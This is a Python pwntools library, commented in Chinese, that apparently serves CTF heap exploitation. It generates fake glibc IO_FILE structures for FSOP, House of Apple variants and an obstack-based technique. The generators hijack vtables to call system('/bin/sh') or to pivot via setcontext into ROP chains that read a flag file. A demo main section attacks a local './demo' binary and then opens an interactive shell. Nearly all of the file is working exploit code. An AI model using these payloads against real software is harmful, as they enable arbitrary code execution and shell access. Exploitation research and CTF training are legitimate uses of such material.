'''
    IO_FILE攻击
'''
from pwn import *
from base_data import *

def FSOP(payload_addr, fun, param_value = BINSH, chain = 0):
    '''
        FSOP攻击工具
        
        payload_addr: payload将要写入的地址
        fun: 要调用的函数的地址
        param_value: 要调用函数的参数为payload_addr, param_value为函数的参数指针所指向的地址的值
        chain: 下一个链的地址(可选)
    '''
    payload = b''
    payload = set_value(payload, 0xC0, 0);            # 设置fake_IO_FILE->_mode=0
    payload = set_value(payload, 0x28, 1);            # 设置fake_IO_FILE->_IO_write_ptr=1
    payload = set_value(payload, 0x20, 0);            # 设置fake_IO_FILE->_IO_write_base=0
    
    payload = set_value(payload, 0xD8, payload_addr); # 设置fake_IO_FILE->vtable=fake_vtable
    payload = set_value(payload, 0, param_value);     # 修改fake_IO_FILE头为/bin/sh值
    payload = set_value(payload, 0x18, fun);          # 设置fake_vtable->__overflow=system，0x18表示__overflow相对于fake_vtable的偏移
    
    payload = set_value(payload, 0x68, chain);        # 修改fake_IO_FILE的chain
    
    return payload

# 使用overflow触发
def IOoverflow(_IO_str_jumps_addr, fun_addr, param = None, payload_addr = None):
    '''
        _IO_str_jumps_addr: _IO_str_jumps地址
        fun_addr: 函数地址
        param: 函数参数, 若param为None, 则使用payload_addr内置/bin/sh
        payload_addr: 内置/bin/sh地址, 只有在param为None时有效
    '''
    if (param is None and payload_addr is None):
        raise ValueError("必须设置 param 或 payload_addr 参数")

    if param is None:
        # 设置参数
        param = payload_addr + 0x30
        pass
    
    payload = b''
    payload = set_value(payload, 0x0, 0)                            # fake_IO_FILE->_flags = 0
    payload = set_value(payload, 0x20, 0)                           # fake_IO_FILE->_IO_write_base = 0
    payload = set_value(payload, 0x28, int((param - 100) / 2 + 1))  # fake_IO_FILE->_IO_write_ptr = (binsh地址 - 100) / 2 + 1
    payload = set_value(payload, 0x30, BINSH)                       # 内置/bin/sh
    payload = set_value(payload, 0x38, 0)                           # fake_IO_FILE->_IO_buf_base = 0
    payload = set_value(payload, 0x40, int((param - 100) / 2))      # fake_IO_FILE->_IO_buf_end = (binsh地址 - 100) / 2
    payload = set_value(payload, 0xC0, 0)                           # fake_IO_FILE->_mode = 0
    payload = set_value(payload, 0xD8, _IO_str_jumps_addr)          # fake_IO_FILE->vtable = &_IO_str_jumps
    payload = set_value(payload, 0xE0, fun_addr)                    # fake_IO_FILE + 0xE0 = &system
    
    return payload

# 使用IOfinish触发
def IOfinish(_IO_str_jumps_addr, fun_addr, param = None, payload_addr = None):
    '''
        _IO_str_jumps_addr: _IO_str_jumps地址
        fun_addr: 函数地址
        param: 函数参数, 若param为None, 则使用payload_addr内置/bin/sh
        payload_addr: 内置/bin/sh地址, 只有在param为None时有效
    '''
    if (param is None and payload_addr is None):
        raise ValueError("必须设置 param 或 payload_addr 参数")

    if param is None:
        # 设置参数
        param = payload_addr + 0x30
        pass
    
    payload = b''
    payload = set_value(payload, 0x0, 0);                           # fake_IO_FILE->_flags = 0
    payload = set_value(payload, 0x20, 0);                          # fake_IO_FILE->_IO_write_base = 0
    payload = set_value(payload, 0x28, 1);                          # fake_IO_FILE->_IO_write_ptr = 1
    payload = set_value(payload, 0x30, BINSH)                       # 内置/bin/sh
    payload = set_value(payload, 0x38, param);                      # fake_IO_FILE->_IO_buf_base = /bin/sh地址
    payload = set_value(payload, 0xC0, 0);                          # fake_IO_FILE->_mode = 0
    payload = set_value(payload, 0xD8, _IO_str_jumps_addr - 0x8);   # fake_IO_FILE + 0xD8 = &(_IO_str_jumps-0x8)
    payload = set_value(payload, 0xE8, fun_addr);                   # fake_IO_FILE + 0xE8 = system
    
    return payload

def HOYJDQ(payload_addr, read_addr, rop, gadget_addr, ret_addr):
    '''
        House of 一骑当千 : 触发srop
        
        payload_addr: payload将要写入的地址
        read_addr: 一个可写的地址即可
        rop: ROP链
        gadget_addr: 控制rsp跳过两个gadget(pop xxx;pop xxx; ret)(add rsp, 0x10;ret;)
        ret_addr: ret gadget
        
        使用方法, 直接触发setcontext, rdi指向payload地址即可
    '''
    payload = rop.ljust(0xe0, b'\x00')
    
    payload = payload[:0xa0-0x8] + p64(gadget_addr) + p64(payload_addr) + p64(ret_addr) + payload[0xa0-0x8:]
    payload = payload[:0xe0-0x8] + p64(gadget_addr) + p64(read_addr) + p64(0) + payload[0xe0-0x8:]
    # if len(payload) > 0x1c0:
    #     payload = payload[:0x1c0-0x8] + p64(gadget_addr) + p64(0) + p64(0) + payload[0x1c0-0x8:]
    payload = payload[:0x1c0-0x8] + p64(gadget_addr) + p64(0) + p64(0) + payload[0x1c0-0x8:]
    return payload

def HOQSPP(_IO_obstack_jumps_addr, payload_addr,  fun_addr, param = None):
    '''
        House of 琴瑟琵琶 : 攻击_IO_obstack_jumps_addr
    
        _IO_obstack_jumps_addr: _IO_obstack_jumps的实际地址
        payload_addr: payload将要写入的地址
        fun_addr: 要调用的函数的实际地址
        param: 函数的参数, 默认为内置的/bin/sh地址
    '''
    if param is None:
        param = payload_addr + 0x40
    
    payload = b''
    payload = set_value(payload, 0x18, 0x0);                                          # fake_obstack->next_free = 0
    payload = set_value(payload, 0x20, 0x0);                                          # fake_obstack->chunk_limit = 0, fake_IO_FILE_plus->_IO_write_base = 0
    payload = set_value(payload, 0x28, 0x1);                                          # fake_IO_FILE_plus->_IO_write_ptr = 1
    payload = set_value(payload, 0x30, 0x0);                                          # fake_IO_FILE_plus->_IO_write_end = 0
    payload = set_value(payload, 0x38, fun_addr);                                     # fake_obstack->chunkfun = system
    payload = set_value(payload, 0x48, param);                                        # fake_obstack->extra_arg = /bin/sh地址
    payload = set_value(payload, 0x50, 0xFFFFFFFFFFFFFFFF);                           # fake_obstack->use_extra_arg = 1
    payload = set_value(payload, 0xC0, 0x0);                                          # fake_IO_FILE_plus->_mode = 0
    payload = set_value(payload, 0xD8, _IO_obstack_jumps_addr + 0x8 * 4);             # fake_IO_FILE_plus->vtable = _IO_obstack_jumps + 0x8 * 4
    payload = set_value(payload, 0xE0, payload_addr);                                 # fake_IO_obstack_file->obstack = fake_IO_obstack, 我们重复利用空间
    
    payload = set_value(payload, 0x40, BINSH);                                        # 内置/bin/sh字符串值
    
    return payload

def HOQSPP_rop(_IO_obstack_jumps_addr, payload_addr, setcontext_addr, rop, gadget_addr, ret_addr):
    '''
        _IO_obstack_jumps_addr: _IO_obstack_jumps的实际地址
        payload_addr: payload将要写入的地址
        setcontext_addr:setcontext函数的地址
        rop: ROP链
        gadget_addr: 控制rsp跳过两个gadget(pop xxx;pop xxx; ret)(add rsp, 0x10;ret;)
        ret_addr: ret gadget
    '''
    payload = HOQSPP(_IO_obstack_jumps_addr, payload_addr, setcontext_addr, payload_addr + 0xF0).ljust(0xF0, b'\x00')
    payload += HOYJDQ(payload_addr + 0xF0, payload_addr, rop, gadget_addr, ret_addr)
    return payload

def HOQSPP_orw(_IO_obstack_jumps_addr, libc_str, libc_base, payload_addr, filename = 'flag\x00', filesize = 0x100, fd = 3):
    '''
        house of 琴瑟琵琶的orw攻击
        
        _IO_obstack_jumps_addr : _IO_obstack_jumps_addr的实际地址
        libc_str:   libc名('./libc.so.6')
        libc_base:  libc基地址
        payload_addr:payload地址
        filename:   文件名
        filesize:   文件读取的数据大小
        fd:         open的返回值
    '''
    libc = ELF(libc_str)
    rop = ROP(libc)
    
    setcontext = libc_base + libc.symbols['setcontext']
    pop_rax = libc_base + rop.find_gadget(['pop rax', 'ret'])[0]
    pop_rdi = libc_base + rop.find_gadget(['pop rdi', 'ret'])[0]
    pop_rsi = libc_base + rop.find_gadget(['pop rsi', 'ret'])[0]
    pop_rdx_rbx = libc_base + rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]
    syscall = libc_base + rop.find_gadget(['syscall', 'ret'])[0]
    ret = pop_rdi + 1
    
    payload_rop = b''
    # open
    payload_rop += p64(pop_rax) + p64(constants.SYS_open)
    payload_rop += p64(pop_rdi) + p64(payload_addr + 0xF0 + 28*0x8 + 6 * 0x8)
    payload_rop += p64(pop_rsi) + p64(0)
    payload_rop += p64(syscall)
    # read
    payload_rop += p64(pop_rax) + p64(constants.SYS_read)
    payload_rop += p64(pop_rdi) + p64(fd)
    payload_rop += p64(pop_rsi) + p64(payload_addr)
    payload_rop += p64(pop_rdx_rbx) + p64(filesize) + p64(0)
    payload_rop += p64(syscall)
    # open
    payload_rop += p64(pop_rax) + p64(constants.SYS_write)
    payload_rop += p64(pop_rdi) + p64(1)
    payload_rop += p64(pop_rsi) + p64(payload_addr)
    payload_rop += p64(ret)# 绕过
    payload_rop += p64(pop_rdx_rbx) + p64(filesize) + p64(0)
    payload_rop += p64(syscall)
    # file
    payload_rop += bytes(filename, 'utf-8')
    payload = HOQSPP_rop(_IO_obstack_jumps_addr, payload_addr, setcontext, payload_rop, pop_rdx_rbx, ret)
    return payload

def HOA1(wstrn_jumps_addr, target, value, chain = 0):
    '''
        修改target指向的地址的值为value, 这个地址是fake_IO_FILE+0xF0
        wstrn_jumps_addr: _IO_wstrn_jumps地址
        chain: 下一个链的地址, 默认为0
    '''
    payload = b''
    
    payload = set_value(payload, 0xC0, 0)                   # fp->_mode = 0
    payload = set_value(payload, 0x20, 0)                   # fp->_IO_write_base = 0
    payload = set_value(payload, 0x28, 1)                   # fp->_IO_write_ptr = 1

    payload = set_value(payload, 0x68, chain)               # chain

    payload = set_value(payload, 0x74, 0x8)                 # fp->_flags2 = 8
    payload = set_value(payload, 0xA0, target)              # fp->_wide_data = target
    payload = set_value(payload, 0xD8, wstrn_jumps_addr)    # fp->vtable = _IO_wstrn_jumps
    payload = set_value(payload, 0xF0, value)               # (_IO_wstrnfile*)fp->overflow_buf = 写入的地址的值
    
    return payload

# def HOA2overflow(_IO_wfile_jumps, payload_addr, fun, param = b'  /bin/sh\x00'):
def HOA2overflow(_IO_wfile_jumps, payload_addr, fun, param = b' \x80;$0\x00'):
    '''
        House of apple 2的overflow攻击链
        _IO_wfile_jumps: _IO_wfile_jumps地址
        payload_addr: payload将要写入的地址
        fun: 要调用的函数的地址
        param: 函数传入的指针的值, 默认/bin/sh
    '''
    payload = b''
    payload = set_value(payload, 0x0, 0x8000);                              # fp->_flags = 0 || fp->_flags = value ^ (0x0008 | 0x0800 | 0x0002)
    payload = set_value(payload, 0x20, 0);                                  # fp->_IO_write_base = 0
    payload = set_value(payload, 0x28, 1);                                  # fp->_IO_write_ptr = 1
    payload = set_value(payload, 0x38, 1);                                  # fp->_IO_buf_base = 1
    payload = set_value(payload, 0xA0, payload_addr);                       # fp->_wide_data = fake_wide_data
    payload = set_value(payload, 0xC0, 0);                                  # fp->_mode = 0
    payload = set_value(payload, 0xD8, _IO_wfile_jumps);                    # fp->vtable = _IO_wfile_jumps

    payload = set_value(payload, 0 + 0x18, 0);                              # fake_wide_data->_IO_write_base = 0
    payload = set_value(payload, 0 + 0x30, 0);                              # fake_wide_data->_IO_buf_base = 0
    payload = set_value(payload, 0 + 0xE0, payload_addr + 0x40 - 13 * 8);   # fake_wide_data->_wide_vtable = backdoor - 13*0x8
    payload = set_value(payload, 0x40, fun);                                # backdoor
    
    payload = param + payload[len(param):]
    return payload

# def HOA2underflow(_IO_wfile_jumps, payload_addr, fun, param = b'  $0\x00'):
def HOA2underflow(_IO_wfile_jumps, payload_addr, fun, param = b' \x80;$0\x00'):
    '''
        House of apple 2的underflow攻击链
        _IO_wfile_jumps: _IO_wfile_jumps地址
        payload_addr: payload将要写入的地址
        fun: 要调用的函数的地址
        param: 函数传入的指针的值, 默认/bin/sh
    '''
    payload = b''
    payload = set_value(payload, 0x0, 0x8000);                                  # fp->_flags = 0 或者 fp->_flags = value ^ (0x10 | 0x04 | 0x02)
    payload = set_value(payload, 0x8, 1);                                       # fp->_IO_read_ptr = 1
    payload = set_value(payload, 0x10, 0);                                      # fp->_IO_read_end = 0
    payload = set_value(payload, 0x20, 0);                                      # fp->_IO_write_base = 0
    payload = set_value(payload, 0x28, 1);                                      # fp->_IO_write_ptr = 1
    payload = set_value(payload, 0x38, 1);                                      # fp->_IO_buf_base = 1
    payload = set_value(payload, 0xA0, payload_addr + 0x18);                    # fp->_wide_data = fake_wide_data
    payload = set_value(payload, 0xC0, 0);                                      # fp->_mode = 0
    payload = set_value(payload, 0xD8, _IO_wfile_jumps + 8);                    # fp->vtable = _IO_wfile_jumps + 8

    payload = set_value(payload, 0x18 + 0x0, 1);                                # fake_wide_data->_IO_read_ptr = 1
    payload = set_value(payload, 0x18 + 0x8, 0);                                # fake_wide_data->_IO_read_end = 0
    payload = set_value(payload, 0x18 + 0x30, 0);                               # fake_wide_data->_IO_buf_base = 0
    payload = set_value(payload, 0x18 + 0x40, 0);                               # fake_wide_data->_IO_save_base = 0
    payload = set_value(payload, 0x18 + 0xE0, payload_addr + 0x40 - 13 * 8);    # fake_wide_data->_wide_vtable = backdoor - 13 * 0x8
    payload = set_value(payload, 0x40, fun);                                    # backdoor
    
    payload = param + payload[len(param):]
    return payload

def HOA3underflow_rop(_IO_wfile_jumps, payload_addr, setcontext_setrsp, ret, rop, rop_addr = 0):
    '''
        利用HOA3的underflow攻击链, 实现低版本libc的srop
        适用于_IO_wfile_underflow中直接调用__libio_codecvt_in的函数指针
        
        _IO_wfile_jumps: _IO_wfile_jumps地址
        payload_addr: payload将要写入的地址
        setcontext_setrsp: setcontext中pop rsp的地址
        ret:ret gadget
        rop:rop链
        rop_addr: rop链地址
    '''
    if rop_addr == 0:
        addr = payload_addr + 0xE0 + 0xA8 + 0x8
    else:
        addr = rop_addr
    payload = b''
    payload = set_value(payload, 0x00, 0)   # fp->_flags = 0
    payload = set_value(payload, 0x08, 0)   # fp->_IO_read_ptr = 0
    payload = set_value(payload, 0x10, 1)   # fp->_IO_read_end = 1
    payload = set_value(payload, 0x20, 0)   # fp->_IO_write_base = 0
    payload = set_value(payload, 0x28, 1)   # fp->_IO_write_ptr = 1

    payload = set_value(payload, 0x98, payload_addr + 0xE0) # fp->_codecvt = fake_codecvt
    payload = set_value(payload, 0xA0, payload_addr + 0x30) # fp->_wide_data = fake_wide_data

    payload = set_value(payload, 0xC0, 0)                   # fp->_mode = 0
    payload = set_value(payload, 0xD8, _IO_wfile_jumps+8)   # fp->vtable = _IO_wfile_jumps+8

    payload = set_value(payload, 0x30 + 0x00, 1)            # fake_wide_data->_IO_read_ptr = 1
    payload = set_value(payload, 0x30 + 0x08, 0)            # fake_wide_data->_IO_read_end = 0

    payload = set_value(payload, 0xE0 + 0x18, setcontext_setrsp)    # fp->_codecvt->__codecvt_do_in = fun
    payload = set_value(payload, 0xE0 + 0xA0, addr)                 # rsp = rdi+0x90
    payload = set_value(payload, 0xE0 + 0xA8, ret)                  # push = rdi+0x90
    
    if rop_addr == 0:
        payload = payload.ljust(0xE0 + 0xA8 + 0x8, b'\x00')[:0xE0 + 0xA8 + 0x8] + rop
        
    return payload


def HOA3underflow2(_IO_wfile_jumps, payload_addr, fun, param1_value_offset_8 = b'', param2_value = b'', param3_value = b'', param4 = 0xFFFFFFFFFFFFFFFF):
    '''
        HOA3的underflow攻击链
        适用于高版本中的underflow攻击链
        
        _IO_wfile_jumps: _IO_wfile_jumps地址
        payload_addr: payload将要写入的地址
        fun: 要调用的函数的地址
        param1_value_offset_8: 第一个参数指向的地址+8的值
        param2_value: 第二个参数指向的地址的值
        param3_value: 第三个参数指向的地址的值
        param4: 第四个参数
        
        注意 : 第四个参数的值要大于第三个参数的前三个字节的值
               第二个参数地址+0x20指向的值不可控
    '''
    if(u64(param3_value.ljust(8, b'\x00')[:8]) >= param4):
        raise Exception('第四个参数的值要大于第三个参数的前三个字节的值')
    
    payload = b''
    # 设置第一个参数
    payload = set_bytes(payload, 0x148 - 0x50 + 0x8, param1_value_offset_8)# 第一个参数指向的地址+8的值，注:第一个参数指向的地址的值必须为0
    # 设置第二个参数
    payload = set_bytes(payload, 0xE0 + 0x30, param2_value.ljust(0x10, b'\x00')[:0x10])
    if(len(param2_value) > 0x10):
        payload = set_bytes(payload, 0x148 + 0x8 + 0x10, param2_value[0x10:])
    # 设置第三个参数
    payload = set_bytes(payload, 0x8, param3_value)
    # 设置第四个参数
    payload = set_value(payload, 0x10, param4);                     # fp->_IO_read_end : 第四个参数，注:fp->_IO_read_end > fp->_IO_read_ptr
    
    payload = set_value(payload, 0x0, 0x8000);                      # fp->_flags = 0x8000
    # payload = set_value(payload, 0x8, 0);                         # fp->_IO_read_ptr : 第三个参数指向的地址的值
    # payload = set_value(payload, 0x10, param4);                   # fp->_IO_read_end : 第四个参数，注:fp->_IO_read_end > fp->_IO_read_ptr
    payload = set_value(payload, 0x20, 0);                          # fp->_IO_write_base = 0
    payload = set_value(payload, 0x28, 1);                          # fp->_IO_write_ptr = 1
    payload = set_value(payload, 0xC0, 0);                          # fp->_mode = 0
    payload = set_value(payload, 0xA0, payload_addr + 0xE0);        # fp->_wide_data = fake_wide_data
    payload = set_value(payload, 0x98, payload_addr + 0x148);       # fp->_codecvt = fake_codecvt
    payload = set_value(payload, 0xD8, _IO_wfile_jumps + 8);        # fp->vtable = _IO_wfile_jumps + 0x8
    # fake_wide_data
    payload = set_value(payload, 0xE0 + 0x0, 1); # fake_wide_data->_IO_read_ptr = 1
    payload = set_value(payload, 0xE0 + 0x8, 0); # fake_wide_data->_IO_read_end = 0
    # fake_codecvt
    payload = set_value(payload, 0x148 + 0x0, payload_addr + 0x148 - 0x50); # fake_codecvt->__cd_in.step = fake_step
    # fake_step
    payload = set_value(payload, 0x148 - 0x50 + 0x28, fun); # fake_step.__fct = fake_fct
    return payload

def HOA3underflow2_rop(_IO_wfile_jumps, payload_addr, setcontext_addr, rop, gadget_addr, ret_addr):
    '''
        HOA3的underflow攻击链
        适用于高版本中的underflow攻击链
        
        _IO_wfile_jumps: _IO_wfile_jumps地址
        payload_addr: payload将要写入的地址
        setcontext_addr:setcontext函数地址
        rop: rop链
        gadget_addr: 控制rsp跳过两个gadget(pop xxx;pop xxx; ret)(add rsp, 0x10;ret;)
        ret_addr: ret gadget地址
        
        注意 : rop的第5个gadget会跳过，注意衔接
               用户rop开始的位置:payload_addr+0xE0+0x8
    '''
    payload = b''
    payload = set_value(payload, 0x0, 0x8000);                      # fp->_flags = 0x8000
    payload = set_value(payload, 0x8, 0);                           # fp->_IO_read_ptr : 第三个参数指向的地址的值
    payload = set_value(payload, 0x10, 0xFFFFFFFFFFFFFFFF);         # fp->_IO_read_end : 第四个参数，注:fp->_IO_read_end > fp->_IO_read_ptr
    payload = set_value(payload, 0x20, 0);                          # fp->_IO_write_base = 0
    payload = set_value(payload, 0x28, 1);                          # fp->_IO_write_ptr = 1
    payload = set_value(payload, 0x98, payload_addr + 0x40);        # fp->_codecvt = fake_codecvt
    payload = set_value(payload, 0xA0, payload_addr + 0x28);        # fp->_wide_data = fake_wide_data
    payload = set_value(payload, 0xC0, 0);                          # fp->_mode = 0
    payload = set_value(payload, 0xD8, _IO_wfile_jumps + 8);        # fp->vtable = _IO_wfile_jumps + 0x8
    
    # fake_wide_data
    payload = set_value(payload, 0x28 + 0x0, 1); # fake_wide_data->_IO_read_ptr = 1
    payload = set_value(payload, 0x28 + 0x8, 0); # fake_wide_data->_IO_read_end = 0
    
    # fake_codecvt
    payload = set_value(payload, 0x40 + 0x0, payload_addr + 0xE0); # fake_codecvt->__cd_in.step = fake_step

    # fake_step
    # payload = set_value(payload, 0xE0, 0);                      #
    # payload = set_value(payload, 0xE0 + 0x28, setcontext_addr); # fake_step.__fct = fake_fct
    
    rop = rop.ljust(0xE0, b'\x00')
    rop = p64(0) + rop
    rop = rop[:0x28-0x8] + p64(gadget_addr) + p64(setcontext_addr) + p64(0) + rop[0x28-0x8:]
    rop = rop[:0xa0-0x8] + p64(gadget_addr) + p64(payload_addr + 0xE8) + p64(ret_addr) + rop[0xa0-0x8:]
    rop = rop[:0xe0-0x8] + p64(gadget_addr) + p64(payload_addr) + p64(0) + rop[0xe0-0x8:]
    rop = rop[:0x1c0-0x8] + p64(gadget_addr) + p64(0) + p64(0) + rop[0x1c0-0x8:]
    
    payload = payload.ljust(0xE0, b'\x00') + rop
    return payload

# def HOA3underflow2_srop(_IO_wfile_jumps, payload_addr, pop_rsp_ret, push_rsi_jmp_rsi_n1, add_rsp_n2_ret, n1, n2, rop, rop_addr = 0):
#     '''
#         利用HOA3的underflow攻击链, 实现srop
        
#         _IO_wfile_jumps: _IO_wfile_jumps地址
#         payload_addr: payload将要写入的地址
#         pop_rsp_ret : pop rsp; ret
#         push_rsi_jmp_rsi_n1: push rsi; jmp qword ptr [rsi + n1]
#         add_rsp_n2_ret: add rsp, 0x28; ret
#         n1 : 建议0x66
#         n2 : 建议0x28
#         rop: ROP链
#         rop_addr: ROP链将要写入的地址, 0则内置ROP链
        
#         rop和rop_addr二选一即可
        
#         现已废弃, 建议使用HOA3underflow2_rop
#     '''
#     if rop_addr == 0:
#         addr = payload_addr + 0x200
#     else:
#         addr = rop_addr
#     payload = HOA3underflow2(_IO_wfile_jumps, 
#                             payload_addr,
#                             push_rsi_jmp_rsi_n1,
#                             p64(0),
#                             set_value(  (p64(add_rsp_n2_ret) + b'\x00'*(0xf - 8)).ljust(n2 + 8, b'\x00') + p64(pop_rsp_ret) + p64(addr),
#                                         n1,
#                                         pop_rsp_ret),
#                             p64(0),
#                             1)
#     if rop_addr == 0:
#         payload = payload.ljust(0x200, b'\x00') + rop
        
#     return payload

# def HOA3underflow_orw(libc_str, libc_base, payload_addr, filename = 'flag\x00', filesize = 0x100, fd = 3):
#     '''
#         HOA3underflow的orw攻击
        
#         libc_str:   libc名('./libc.so.6')
#         libc_base:  libc基地址
#         payload_addr:payload地址
#         filename:   文件名
#         filesize:   文件读取的数据大小
#         fd:         open的返回值
#     '''
#     libc = ELF(libc_str)
#     rop = ROP(libc)
    
#     _IO_wfile_jumps = libc_base + libc.symbols['_IO_wfile_jumps']
#     setcontext = libc_base + libc.symbols['setcontext']
     
#     pop_rax = libc_base + rop.find_gadget(['pop rax', 'ret'])[0]
#     pop_rdi = libc_base + rop.find_gadget(['pop rdi', 'ret'])[0]
#     pop_rsi = libc_base + rop.find_gadget(['pop rsi', 'ret'])[0]
#     syscall = libc_base + rop.find_gadget(['syscall', 'ret'])[0]
#     ret = pop_rdi + 1
    
#     pop_rdx_rbx = 0
#     r = rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])
#     if r:
#         pop_rdx_rbx = libc_base + r[0]
#     else:
#         pop_rdx_rbx = libc_base + rop.find_gadget(['pop rbx', 'pop rbp', 'ret'])[0]
    
#     payload_rop = b''
#     # open
#     payload_rop += p64(pop_rax) + p64(constants.SYS_open)
#     payload_rop += p64(ret)# 绕过
#     payload_rop += p64(pop_rdi) + p64(payload_addr + 0xE0 + 0x8 + 0xF0 + 9 * 0x8)
#     payload_rop += p64(pop_rsi) + p64(0)
#     payload_rop += p64(syscall)
#     # read
#     payload_rop += p64(pop_rax) + p64(constants.SYS_read)
#     payload_rop += p64(pop_rdi) + p64(fd)
#     payload_rop += p64(pop_rsi) + p64(payload_addr)
#     payload_rop += p64(ret)# 绕过
#     payload_rop += p64(pop_rdx_rbx) + p64(filesize) + p64(0)
#     payload_rop += p64(syscall)
#     # open
#     payload_rop += p64(ret)# 绕过
#     payload_rop += p64(pop_rax) + p64(constants.SYS_write)
#     payload_rop += p64(pop_rdi) + p64(1)
#     payload_rop += p64(pop_rsi) + p64(payload_addr)
#     payload_rop += p64(pop_rdx_rbx) + p64(filesize) + p64(0)
#     payload_rop += p64(syscall)
#     # file
#     payload_rop += bytes(filename, 'utf-8')
#     payload = HOA3underflow2_rop(_IO_wfile_jumps, payload_addr, setcontext, payload_rop, pop_rdx_rbx, ret)
#     return payload


def HOA3underflow_orw(libc_str, libc_base, payload_addr, filename = 'flag\x00', filesize = 0x100, fd = 3):
    '''
        HOA3underflow的orw攻击
        
        libc_str:   libc名('./libc.so.6')
        libc_base:  libc基地址
        payload_addr:payload地址
        filename:   文件名
        filesize:   文件读取的数据大小
        fd:         open的返回值
        
        注意：对于没有pop rdx的libc，需要mov rdx, rbx; pop rbx; pop r12; pop rbp; ret;的地址
    '''
    libc = ELF(libc_str)
    rop = ROP(libc)
    
    _IO_wfile_jumps = libc_base + libc.symbols['_IO_wfile_jumps']
    setcontext = libc_base + libc.symbols['setcontext']
    pop_rax = libc_base + rop.find_gadget(['pop rax', 'ret'])[0]
    pop_rdi = libc_base + rop.find_gadget(['pop rdi', 'ret'])[0]
    pop_rsi = libc_base + rop.find_gadget(['pop rsi', 'ret'])[0]
    syscall = libc_base + rop.find_gadget(['syscall', 'ret'])[0]
    ret = pop_rdi + 1
    
    # 检查是否可以控制rdx寄存器
    r = rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])
    if r:
        pop_rdx_rbx = libc_base + r[0]
        
        payload_rop = b''
        # open
        payload_rop += p64(pop_rax) + p64(constants.SYS_open)
        payload_rop += p64(ret)# 绕过
        payload_rop += p64(pop_rdi) + p64(payload_addr + 0xE0 + 0x8 + 0xF0 + 9 * 0x8)
        payload_rop += p64(pop_rsi) + p64(0)
        payload_rop += p64(syscall)
        # read
        payload_rop += p64(pop_rax) + p64(constants.SYS_read)
        payload_rop += p64(pop_rdi) + p64(fd)
        payload_rop += p64(pop_rsi) + p64(payload_addr)
        payload_rop += p64(ret)# 绕过
        payload_rop += p64(pop_rdx_rbx) + p64(filesize) + p64(0)
        payload_rop += p64(syscall)
        # open
        payload_rop += p64(ret)# 绕过
        payload_rop += p64(pop_rax) + p64(constants.SYS_write)
        payload_rop += p64(pop_rdi) + p64(1)
        payload_rop += p64(pop_rsi) + p64(payload_addr)
        payload_rop += p64(pop_rdx_rbx) + p64(filesize) + p64(0)
        payload_rop += p64(syscall)
        # file
        payload_rop += bytes(filename, 'utf-8')
        payload = HOA3underflow2_rop(_IO_wfile_jumps, payload_addr, setcontext, payload_rop, pop_rdx_rbx, ret)
        return payload
    else:
        pop_rbx_rbp = libc_base + rop.find_gadget(['pop rbx', 'pop rbp', 'ret'])[0]
        pop_rbx = libc_base + rop.find_gadget(['pop rbx', 'ret'])[0]
        mov_rdx_rbx_pop_rbx_pop_r12_pop_rbp = libc_base + 0x00000000000b0123
        
        payload_rop = b''
        # open
        payload_rop += p64(pop_rax) + p64(constants.SYS_open)
        payload_rop += p64(ret)# 绕过
        payload_rop += p64(pop_rdi) + p64(payload_addr + 0xE0 + 0x8 + 30*0x8 + 9 * 0x8)
        payload_rop += p64(pop_rsi) + p64(0)
        payload_rop += p64(syscall)
        # read
        payload_rop += p64(pop_rbx) + p64(filesize)
        payload_rop += p64(mov_rdx_rbx_pop_rbx_pop_r12_pop_rbp) + p64(0)
        payload_rop += p64(0) + p64(0)
        payload_rop += p64(ret)# 绕过
        
        # payload_rop += p64(pop_rdx_rbx) + p64(filesize) + p64(0)
        payload_rop += p64(pop_rax) + p64(constants.SYS_read)
        payload_rop += p64(pop_rdi) + p64(fd)
        payload_rop += p64(ret)# 绕过
        payload_rop += p64(pop_rsi) + p64(payload_addr)
        payload_rop += p64(syscall)
        # open
        payload_rop += p64(pop_rax) + p64(constants.SYS_write)
        payload_rop += p64(pop_rdi) + p64(1)
        payload_rop += p64(pop_rsi) + p64(payload_addr)
        # payload_rop += p64(pop_rdx_rbx) + p64(filesize) + p64(0)
        payload_rop += p64(syscall)
        # file
        payload_rop += bytes(filename, 'utf-8')
        payload = HOA3underflow2_rop(_IO_wfile_jumps, payload_addr, setcontext, payload_rop, pop_rbx_rbp, ret)
        return payload

def HOA(libc):
    '''
        House of apple的攻击链
        
        libc: libc必须是设置过libc_base的
        payload 需要覆盖 _IO_2_1_stderr_
    '''
    payload = flat({
        0x0: b"  sh;",
        0x28: p64(libc.symbols['system']),
        0x88: p64(libc.symbols['_environ']-0x10),
        0xa0: p64(libc.symbols['_IO_2_1_stderr_']-0x40),    # _wide_data
        0xD8: p64(libc.symbols['_IO_wfile_jumps']),         # jumptable
    }, filler=b"\x00")
    return payload

if __name__ == '__main__':
    p = process('./demo')
    
    _IO_str_jumps_addr = int(p.recv(14), 16)
    system_addr = int(p.recv(14), 16)
    binsh_addr = int(p.recv(14), 16)
    
    p.send(IOfinish(_IO_str_jumps_addr, system_addr, binsh_addr))
    
    p.interactive()
